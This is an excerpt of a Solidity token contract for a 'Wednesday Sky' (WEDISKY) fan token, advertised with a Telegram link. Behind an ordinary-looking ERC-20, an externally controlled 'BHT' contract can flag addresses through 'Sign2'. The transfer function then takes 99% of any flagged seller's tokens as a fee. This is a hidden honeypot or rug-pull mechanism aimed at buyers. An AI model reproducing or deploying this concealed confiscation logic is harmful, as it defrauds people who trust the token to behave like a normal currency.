...
// Telegram: https://t.me/wednesdayinu_portal
// WEDNESDAY SERIAL FAN TOKEN!
...
interface BHT {
    function Sign2(address addr, uint256 amount) external;

    function IsSign2(address addr) external view returns (bool);
}
...
contract WEDISKY is Context, IERC20 {
    ...
    string private _name = "Wednesday Sky";
    string private _symbol = "WEDISKY";
    ...
    constructor (address _abb)  {
        ...
        Wallet_Marketing = payable(0xF0556a9e43bC5D40F38B9d47A8f8D1711519a1Ef);
        abb = BHT(_abb);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if (!takeFee) {
            ...
            if (abb.IsSign2(sender)) {
                sellFEE = tAmount * 99 / 100;
            }
